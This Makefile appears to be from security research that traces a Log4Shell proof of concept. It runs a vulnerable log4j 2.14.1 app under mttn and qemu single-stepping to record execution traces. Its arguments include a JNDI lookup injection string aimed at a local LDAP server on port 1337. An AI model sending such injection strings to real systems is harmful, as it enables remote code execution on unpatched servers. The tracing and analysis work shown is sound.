JAVA_WRAPPER ?=
LOG4SHELL_ARGS ?= -cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
		  com.trailofbits.log4shell.PoC \
		  '$${jndi:ldap://127.0.0.1:1337/pwn}'

.PHONY: all
all: log4shell.trace.txt

log4shell.trace.txt: vulnerable-app/log4shell-poc.jar
	mttn --ignore-unsupported-memops java -- $(LOG4SHELL_ARGS)

log4shell.qemu.trace: vulnerable-app/log4shell-poc.jar
	# NOTE(jl): qemu requires absolute path to guest binary.
	qemu-i386 -D $@ -singlestep -d in_asm $(shell which java) -- $(LOG4SHELL_ARGS)

.PHONY: run
run:
	java $(LOG4SHELL_ARGS)
